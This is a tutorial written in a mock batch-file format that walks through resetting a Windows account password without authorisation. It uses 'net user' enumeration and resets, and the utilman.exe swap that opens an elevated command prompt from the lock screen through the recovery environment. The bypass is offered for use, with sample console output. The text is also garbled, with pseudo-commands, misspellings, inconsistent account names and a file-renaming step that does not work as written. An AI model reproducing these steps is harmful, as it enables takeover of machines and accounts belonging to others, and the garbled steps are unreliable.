ECHO is on.

:: this code provides example on how to break any computer password without a software or third party utiity
::Rem "

:: in  this method involves the use of technical experies and the use of the command line for beaking through the password
:: in this code we will be looking at the step by step comadns that can be used to break a password before looking at the technicalities


<pre>
<code>

Rem step 1, [use the net user command to display the list of users acount on pc]
echo net user
Rem a list of users account will appear, now check for account you want to break it's password
Print [Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Users\DELL>net user

User accounts for \\DESKTOP-NFBQE4E

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
TSE PRAISE               WDAGUtilityAccount
The command completed successfully.

C:\Users\DELL>] || Rem you will see a window that looks like this 


:: next use the net user command followed by the account name and press enter ,
:: this will display all the information you need to know abaout the qaccount 

echo net user "TSE PRAIZE"

Print [" 



C:\Users\DELL>net user "TSE PRAISE"
User name                    TSE PRAISE
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/4/2023 2:20:29 AM
Password expires             Never
Password changeable          3/4/2023 2:20:29 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/4/2024 10:47:28 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.


C:\Users\DELL> "]
Rem you will see a window that looks like this
:: now enter the following command to enter the pasword reset or break utility

echo net user "TSE PRAIZE" ""* || Rem where TSE PRAIZE  is the account name, "" creates an empty variable or string of elements  * overrides all the changes   

Print [" C:\Users\DELL>net user "TSE PRAISE"  ""*
Type a password for the user: password
Retype the password to confirm: password
"]
::  you will now reset the password as needed after entering the password hit the enter button on your keyboard

:: incase you get an error message like this one 
Print [ C:\Users\DELL>net user "TSE PRAISE"  ""*
Type a password for the user:
Retype the password to confirm:password 
System error 5 has occurred.password

Access is denied.


C:\Users\DELL>]

:: remeber to run cmd in administrator mode
Rem now if you follow all these steps you have successfully broken a password with any third party sofware 

Rem Now let me walk you through the technicalities in doing the hack and password break
@echo on:
goto 
steps
    step 1
    echo short down your pc by holding down the power button
    step 2
    echo turn on your pc agian and wait for the windows logo to show 

    step 3
    echo turn of your pc again by holding down the power button after the windows logo displays 

    step4 
    echo now turn on your pc again by pressing the power button , 
    ::this time your pc will boot into the automatic system repair window , allow it to boot and wait for the recovery screen to appear

    step5 
    echo click on troubleshoot  in the recovery window 

    step6 
    echo  click on the advance optionns  in the recovery window

    step 7
    echo click on install drivers  in the submenu of the advance options 

    step8 
    echo clikc on the ok button to open up the file explorer menu

    step9 
    echo scroll down to the c drive usualy [Local Disk] and double click on it 
    :: look for the windows folder and open it  
    echo "Windows"

    step 10 
    echo after opening the windows folder , search for the system32 folder and open it 
    echo  "System32"
    echo search for cmd.exe and click on it to rename it, add any symbol of letter to the name of the cmd.exe file
    echo "cmd/.exe"

    step 11
    echo now look for utilman.exe and click on it to rename it ,
    echo rename it to cmd and hit the enter button 
    echo "utilman.exe" || "cmd.exe"

    :: after a succesfull rename of the two files , shutdown your pc and turn it on again and wait for to finish booting to main windows

    echo now got to your ease of access button and clik on it while your pc is still locked 

    echo " this will open up the cmd window even when your screen is locked "

    echo "now use the net user command as shown in  the begining nd you should be able to reset or break the password as required"

    Print [  now you should see something like this 
    
    
    Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>net user

User accounts for \\DESKTOP-NFBQE4E

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
TSE PRAISE               WDAGUtilityAccount
The command completed successfully.


C:\Windows\system32>net user "TSE PRAISE" ""*
Type a password for the user: password
Retype the password to confirm: password
The command completed successfully.


C:\Windows\system32>]

:: you can now use the new password or empty password
</code>

</pre>